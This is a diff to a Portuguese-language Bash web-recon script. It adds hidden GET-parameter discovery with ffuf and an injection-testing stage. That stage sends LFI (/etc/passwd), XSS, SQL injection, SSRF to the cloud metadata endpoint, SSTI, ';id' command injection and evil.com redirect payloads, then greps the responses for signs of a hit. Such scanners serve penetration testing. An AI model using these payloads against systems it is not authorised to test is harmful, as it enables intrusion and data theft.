@@ -60,6 +60,8 @@ add_wl "dirb-common"           "/usr/share/wordlists/dirb/common.txt"           
 add_wl "seclists-raft-medium"  "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt" "dirs"
 add_wl "seclists-common"       "/usr/share/seclists/Discovery/Web-Content/common.txt"         "dirs"
 add_wl "seclists-subs-5k"      "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt" "subs"
+add_wl "burp-params"           "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" "params"
+add_wl "top-app-params"        "/usr/share/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt" "params"
 
 WL_TOTAL=$wl_idx
 
@@ -222,6 +224,164 @@ scan_files_only() {
     ok "Concluído."
 }
 
+scan_params() {
+    local target_url="$1"
+    local wl="$2"
+
+    if ! has ffuf; then
+        fail "ffuf necessário para parameter fuzzing."
+        return 1
+    fi
+
+    echo -e "\n${BOLD}══ PARAMETER FUZZING ══${RST}"
+    info "URL: ${target_url}"
+    info "Wordlist: $(basename "$wl") ($(wc -l < "$wl") entradas)"
+
+    # ── FASE A: Descobrir parâmetros que alteram a resposta ──
+    info "Fase A — Descobrindo parâmetros ocultos..."
+
+    # Baseline: response size SEM parâmetros
+    baseline_size=$(curl -sk -o /dev/null -w "%{size_download}" --connect-timeout 5 "$target_url" 2>/dev/null)
+    info "Baseline size: ${baseline_size} bytes"
+
+    # ffuf com FUZZ como nome do parâmetro
+    ffuf -u "${target_url}?FUZZ=test123" \
+        -w "$wl" \
+        -mc all \
+        -fs "$baseline_size" \
+        -ac \
+        -t 50 -c \
+        -o "${OUTDIR}/ffuf_params_discovery.json" \
+        -of json 2>/dev/null | tee "${OUTDIR}/ffuf_params_discovery.txt" 2>/dev/null || true
+
+    # Extrair parâmetros encontrados do JSON
+    local params_found=()
+    if [[ -s "${OUTDIR}/ffuf_params_discovery.json" ]]; then
+        while IFS= read -r p; do
+            [[ -n "$p" ]] && params_found+=("$p")
+        done < <(grep -oP '"input":\{"FUZZ":"\\K[^"]+' "${OUTDIR}/ffuf_params_discovery.json" 2>/dev/null | sort -u)
+    fi
+
+    if [[ ${#params_found[@]} -eq 0 ]]; then
+        warn "Nenhum parâmetro oculto encontrado na fase A."
+        echo -e "    ${BLU}Dica: tente em páginas específicas (.php, /api/, /search)${RST}"
+        ok "Concluído."
+        return 0
+    fi
+
+    ok "Parâmetros encontrados: ${#params_found[@]}"
+    printf '%s\n' "${params_found[@]}" > "${OUTDIR}/params_found.txt"
+    for p in "${params_found[@]}"; do
+        echo -e "    ${GRN}→${RST} ${p}"
+    done
+
+    # ── FASE B: Testar injeções nos parâmetros encontrados ──
+    echo ""
+    info "Fase B — Testando injeções nos ${#params_found[@]} parâmetros..."
+
+    # Payloads de teste por categoria
+    declare -A PAYLOADS
+    PAYLOADS[LFI]="../../../../etc/passwd"
+    PAYLOADS[LFI2]="....//....//....//etc/passwd"
+    PAYLOADS[XSS]="<script>alert(1)</script>"
+    PAYLOADS[XSS2]="'\"><img src=x onerror=alert(1)>"
+    PAYLOADS[SQLi]="' OR '1'='1"
+    PAYLOADS[SQLi2]="1' AND SLEEP(2)-- -"
+    PAYLOADS[SQLi3]="\" OR \"\"=\""
+    PAYLOADS[SSRF]="http://127.0.0.1:80"
+    PAYLOADS[SSRF2]="http://169.254.169.254/latest/meta-data/"
+    PAYLOADS[SSTI]="{{7*7}}"
+    PAYLOADS[CMDI]=";id"
+    PAYLOADS[IDOR]="1"
+    PAYLOADS[REDIRECT]="https://evil.com"
+
+    > "${OUTDIR}/params_vulns.txt"
+
+    for param in "${params_found[@]}"; do
+        echo -e "\n    ${CYN}── Testando: ${param} ──${RST}"
+
+        # Baseline com valor normal
+        normal_resp=$(curl -sk --connect-timeout 5 "${target_url}?${param}=normaltest123" 2>/dev/null)
+        normal_size=${#normal_resp}
+
+        for vuln_type in "${!PAYLOADS[@]}"; do
+            payload="${PAYLOADS[$vuln_type]}"
+            # URL encode básico
+            encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "$payload")
+
+            test_resp=$(curl -sk --connect-timeout 5 "${target_url}?${param}=${encoded}" 2>/dev/null)
+            test_size=${#test_resp}
+
+            # Verificar indicadores de vulnerabilidade
+            is_vuln=false
+            vuln_evidence=""
+
+            case "$vuln_type" in
+                LFI|LFI2)
+                    if echo "$test_resp" | grep -q "root:x:0:0\|root:.*:/bin/"; then
+                        is_vuln=true
+                        vuln_evidence="/etc/passwd no response!"
+                    fi
+                    ;;
+                XSS|XSS2)
+                    if echo "$test_resp" | grep -q "<script>alert(1)</script>\|onerror=alert"; then
+                        is_vuln=true
+                        vuln_evidence="payload refletido sem sanitização"
+                    fi
+                    ;;
+                SQLi|SQLi2|SQLi3)
+                    if echo "$test_resp" | grep -qi "sql syntax\|mysql\|sqlite\|postgresql\|ORA-\|unterminated\|ODBC"; then
+                        is_vuln=true
+                        vuln_evidence="erro SQL no response"
+                    elif [[ $((test_size - normal_size)) -gt 500 || $((test_size - normal_size)) -lt -500 ]]; then
+                        # Diferença grande de tamanho pode indicar bypass de auth
+                        vuln_evidence="size diff significativo (${normal_size}→${test_size})"
+                    fi
+                    ;;
+                SSRF|SSRF2)
+                    # Difícil detectar sem out-of-band, marcar se response mudou
+                    if [[ $((test_size - normal_size)) -gt 200 || $((test_size - normal_size)) -lt -200 ]]; then
+                        vuln_evidence="response alterado com URL interna"
+                    fi
+                    ;;
+                SSTI)
+                    if echo "$test_resp" | grep -q "49"; then
+                        is_vuln=true
+                        vuln_evidence="{{7*7}}=49 refletido!"
+                    fi
+                    ;;
+                CMDI)
+                    if echo "$test_resp" | grep -q "uid=\|gid="; then
+                        is_vuln=true
+                        vuln_evidence="output de comando detectado!"
+                    fi
+                    ;;
+            esac
+
+            if $is_vuln; then
+                echo -e "      ${RED}🔴 ${vuln_type}: POSSÍVEL VULN! ${vuln_evidence}${RST}"
+                echo "[VULN] param=${param} type=${vuln_type} evidence=${vuln_evidence}" >> "${OUTDIR}/params_vulns.txt"
+            elif [[ -n "$vuln_evidence" ]]; then
+                echo -e "      ${YLW}🟡 ${vuln_type}: ${vuln_evidence}${RST}"
+                echo "[INTERESTING] param=${param} type=${vuln_type} evidence=${vuln_evidence}" >> "${OUTDIR}/params_vulns.txt"
+            fi
+        done
+    done
+
+    echo ""
+    if [[ -s "${OUTDIR}/params_vulns.txt" ]]; then
+        local vulns=$(grep -c "VULN" "${OUTDIR}/params_vulns.txt" 2>/dev/null || echo 0)
+        local interesting=$(grep -c "INTERESTING" "${OUTDIR}/params_vulns.txt" 2>/dev/null || echo 0)
+        echo -e "    ${RED}🔴 Vulneráveis: ${vulns}${RST}"
+        echo -e "    ${YLW}🟡 Interessantes: ${interesting}${RST}"
+        ok "→ params_vulns.txt"
+    else
+        ok "Nenhuma injeção detectada nos parâmetros encontrados."
+    fi
+    ok "→ params_found.txt"
+    ok "Concluído."
+}
+
 # ═══════════════════════════════════════════
 #  MENU — Listar wordlists
 # ═══════════════════════════════════════════
@@ -234,10 +394,11 @@ show_wordlists() {
         local tp="${WL_MAP["${i}_type"]}"
         local color="$RST"
         case "$tp" in
-            dirs)  color="$GRN" ;;
-            subs)  color="$CYN" ;;
-            files) color="$MAG" ;;
-            ext)   color="$YLW" ;;
+            dirs)   color="$GRN" ;;
+            subs)   color="$CYN" ;;
+            files)  color="$MAG" ;;
+            ext)    color="$YLW" ;;
+            params) color="$RED" ;;
         esac
         printf "    ${color}%2d${RST}) %-25s %6s linhas  [%s]\n" "$i" "$label" "$sz" "$tp"
     done
@@ -255,7 +416,8 @@ show_menu() {
     echo -e "  ${GRN}3${RST}) Subdomínios DNS"
     echo -e "  ${GRN}4${RST}) Extensões (dirs + extensões)"
     echo -e "  ${GRN}5${RST}) Arquivos (wordlist de filenames)"
-    echo -e "  ${GRN}6${RST}) ${MAG}FULL${RST} (tudo sequencial)"
+    echo -e "  ${GRN}6${RST}) ${RED}Parâmetros${RST} (GET param fuzzing + injeções)"
+    echo -e "  ${GRN}7${RST}) ${MAG}FULL${RST} (tudo sequencial)"
     echo ""
     echo -e "  ${GRN}w${RST}) Ver wordlists disponíveis"
     echo -e "  ${GRN}q${RST}) Voltar"
@@ -320,6 +482,15 @@ run_auto() {
     fi
 
     [[ -n "$files_wl" ]] && scan_files_only "$files_wl"
+
+    # Parameter fuzzing automático
+    local param_wl=""
+    for i in $(seq 1 "$WL_TOTAL"); do
+        [[ "${WL_MAP["${i}_type"]}" == "params" ]] && { param_wl="${WL_MAP["${i}_path"]}"; break; }
+    done
+    if [[ -n "$param_wl" ]]; then
+        scan_params "${BASE_URL}/" "$param_wl"
+    fi
 }
 
 # ═══════════════════════════════════════════
@@ -377,6 +548,14 @@ run_interactive() {
                 scan_files_only "$PICKED_WL"
                 ;;
             6)
+                echo -e "\n${YLW}[?]${RST} URL alvo para param fuzzing (ex: ${BASE_URL}/index.php)"
+                echo -e "    ${BLU}Dica: use uma página que aceite parâmetros${RST}"
+                read -rp "$(echo -e "${YLW}[?]${RST} URL [Enter=${BASE_URL}/]: ")" param_url
+                param_url="${param_url:-${BASE_URL}/}"
+                pick_wordlist "params"
+                scan_params "$param_url" "$PICKED_WL"
+                ;;
+            7)
                 run_auto
                 ;;
             w)
